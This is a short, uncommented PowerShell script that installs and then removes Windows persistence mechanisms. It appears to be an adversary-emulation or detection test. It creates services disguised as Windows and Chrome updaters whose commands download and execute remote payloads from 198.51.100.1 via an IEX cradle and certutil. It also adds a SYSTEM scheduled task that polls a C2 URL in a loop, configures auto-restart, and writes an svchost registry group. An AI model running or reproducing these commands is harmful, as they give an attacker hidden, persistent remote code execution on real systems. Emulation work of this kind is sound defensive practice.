$svcBin = "$env:TEMP\svc_update.exe"
$pe = [byte[]]@(0x4D, 0x5A, 0x90, 0x00) + (New-Object byte[] 2044)
try { [System.IO.File]::WriteAllBytes($svcBin, $pe) } catch {}

& sc.exe create "WindowsUpdateHelper" binPath= "cmd.exe /c powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.1/stage2.ps1')" start= auto DisplayName= "Windows Update Helper Service" 2>&1 | Out-Null
& sc.exe create "ChromeUpdateSvc" binPath= $svcBin start= auto 2>&1 | Out-Null
& sc.exe create "HealthCheckAgent" binPath= "cmd.exe /c certutil.exe -urlcache -split -f http://198.51.100.1/beacon.exe %TEMP%\beacon.exe && %TEMP%\beacon.exe" start= auto 2>&1 | Out-Null

& sc.exe description "WindowsUpdateHelper" "Provides automatic Windows update functionality" 2>&1 | Out-Null
& sc.exe failure "WindowsUpdateHelper" reset= 0 actions= restart/5000/restart/10000/restart/30000 2>&1 | Out-Null

& sc.exe start "WindowsUpdateHelper" 2>&1 | Out-Null
& sc.exe start "ChromeUpdateSvc" 2>&1 | Out-Null

& schtasks.exe /create /tn "GoogleUpdateTaskMachineCore" /tr "powershell.exe -ep bypass -w hidden -nop -c `"while(`$true){try{IEX(iwr http://198.51.100.1/c2)}catch{};sleep 300}`"" /sc onstart /ru SYSTEM /f 2>&1 | Out-Null

& reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "evilsvcgroup" /t REG_MULTI_SZ /d "WindowsUpdateHelper" /f 2>&1 | Out-Null

& sc.exe delete "WindowsUpdateHelper" 2>&1 | Out-Null
& sc.exe delete "ChromeUpdateSvc" 2>&1 | Out-Null
& sc.exe delete "HealthCheckAgent" 2>&1 | Out-Null
& schtasks.exe /delete /tn "GoogleUpdateTaskMachineCore" /f 2>&1 | Out-Null
& reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "evilsvcgroup" /f 2>&1 | Out-Null
Remove-Item $svcBin -Force -ErrorAction SilentlyContinue
